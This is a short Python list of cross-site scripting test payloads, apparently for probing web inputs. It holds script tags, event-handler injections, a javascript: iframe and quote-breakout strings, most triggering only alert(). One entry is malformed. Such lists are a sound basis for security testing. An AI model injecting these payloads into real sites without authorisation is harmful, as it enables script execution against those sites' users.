payloads_xss = [
    "<script>alert('XSS')</script>",
    "'\"><script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<script>console.log('XSS')</script>",
    "<body onload=alert('XSS')>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "');alert('XSS');//",
    "<input type='text' value='<script>alert(1)</script>'>",
    "<script src='data:text/javascript;base64,YWxlcnQoMTA=')",
    "<svg><script>alert('XSS')</script></svg>"
]